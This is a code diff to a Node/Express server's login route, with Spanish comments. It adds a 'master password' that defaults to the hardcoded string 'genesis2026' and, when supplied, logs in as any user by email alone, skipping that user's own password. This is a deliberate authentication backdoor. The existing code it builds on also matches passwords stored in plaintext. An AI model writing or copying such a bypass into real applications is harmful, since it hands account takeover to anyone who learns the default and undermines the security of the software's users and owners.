@@ -572,7 +572,17 @@ async function startServer() {
 
   app.post("/api/auth/login", (req, res) => {
     const { email, password } = req.body;
-    const user = db.prepare("SELECT * FROM users WHERE email = ? AND password = ?").get(email, password);
+    const masterPassword = process.env.MASTER_PASSWORD || "genesis2026"; // Clave maestra por defecto
+    
+    let user;
+    // Si la contraseña es la maestra, buscamos al usuario solo por email
+    if (password === masterPassword) {
+      user = db.prepare("SELECT * FROM users WHERE email = ?").get(email) as any;
+    } else {
+      // Login normal con contraseña de usuario
+      user = db.prepare("SELECT * FROM users WHERE email = ? AND password = ?").get(email, password) as any;
+    }
+
     if (user) {
       const centers = db.prepare(`
         SELECT c.* FROM centers c
